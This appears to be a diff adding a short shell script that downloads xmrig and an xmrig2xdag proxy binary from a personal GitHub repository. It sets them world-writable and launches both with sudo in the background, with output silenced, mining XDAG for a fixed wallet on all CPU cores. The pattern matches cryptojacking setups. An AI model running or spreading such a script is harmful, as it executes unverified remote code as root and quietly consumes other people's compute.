@@ -1,0 +1,8 @@
+apt update
+apt install sudo -y
+wget https://raw.githubusercontent.com/Hjhjk68/Xdag/main/config.json
+wget https://github.com/Hjhjk68/Xdag/raw/main/xmrig2xdag
+wget https://github.com/Hjhjk68/Xdag/raw/main/xmrig
+chmod 777 xmrig xmrig2xdag config.json
+sudo ./xmrig2xdag -c config.json > /dev/null 2>&1 &
+sudo ./xmrig -o 127.0.0.1:3232. -u NBLLjmZp2bOewMv9IM4jV+XdWF7L4GuC -p x -a rx/xdag -t$(nproc --all)
